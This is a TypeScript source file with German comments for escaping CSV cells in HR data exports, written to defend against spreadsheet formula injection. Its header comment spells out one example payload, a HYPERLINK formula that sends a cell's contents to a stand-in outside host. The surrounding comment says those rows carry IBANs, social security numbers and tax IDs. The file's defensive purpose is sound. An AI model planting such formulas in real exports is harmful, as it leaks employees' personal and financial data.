/**
 * CSV-Ausgabe fuer die Export-Endpunkte.
 *
 * **Warum das eine eigene Datei ist.** Beide Exporte hatten ihre eigene
 * Escape-Funktion, und beide dachten nur an Trennzeichen und
 * Anfuehrungszeichen. Damit ist die Datei wohlgeformt — aber nicht
 * ungefaehrlich.
 *
 * Excel und LibreOffice werten eine Zelle als **Formel**, wenn sie mit `=`,
 * `+`, `-`, `@`, Tabulator oder Wagenruecklauf beginnt. Anfuehrungszeichen
 * schuetzen davor nicht. Wer im Personalfragebogen als Geburtsort
 * `=HYPERLINK("https://fremde.example/"&A1;"Bitte oeffnen")` eintraegt, laesst
 * die Formel auf dem Rechner der Personalabteilung laufen, sobald jemand den
 * LOGA-Export oeffnet — und in derselben Zeile stehen die entschluesselte
 * IBAN, die Sozialversicherungsnummer und die Steuer-ID.
 *
 * Der Fragebogen ist oeffentlich ueber einen Magic Link erreichbar; die
 * Eingabe muss also niemand erst erschleichen.
 *
 * Gegenmittel ist ein vorangestelltes Apostroph: Excel zeigt es nicht an und
 * behandelt den Inhalt als Text.
 */

/** Zeichen, mit denen eine Tabellenkalkulation eine Formel beginnen laesst. */
const FORMEL_START = /^[=+\-@\t\r]/;

/**
 * Entschaerft einen Wert, bevor er in eine Zelle geht.
 *
 * Trennt bewusst zwischen "sieht aus wie eine Formel" und "muss gequotet
 * werden" — das sind zwei verschiedene Probleme, und nur eines davon war
 * bisher geloest.
 */
export function csvWert(value: unknown): string {
  const roh = value === null || value === undefined ? "" : String(value);
  return FORMEL_START.test(roh) ? `'${roh}` : roh;
}

/**
 * Eine vollstaendige Zelle: entschaerft und, wo noetig, gequotet.
 *
 * Quotet nur, wenn es sein muss — sonst bliebe jede Zelle in
 * Anfuehrungszeichen, was manche Importwege (LOGA) unnoetig belastet.
 */
export function csvZelle(value: unknown): string {
  const wert = csvWert(value);
  const brauchtQuotes =
    wert.includes(";") ||
    wert.includes('"') ||
    wert.includes("\n") ||
    wert.includes("\r");
  return brauchtQuotes ? `"${wert.replace(/"/g, '""')}"` : wert;
}

/** Eine Zeile aus Werten, mit Semikolon getrennt (deutsche Excel-Fassungen). */
export function csvZeile(werte: readonly unknown[]): string {
  return werte.map(csvZelle).join(";");
}
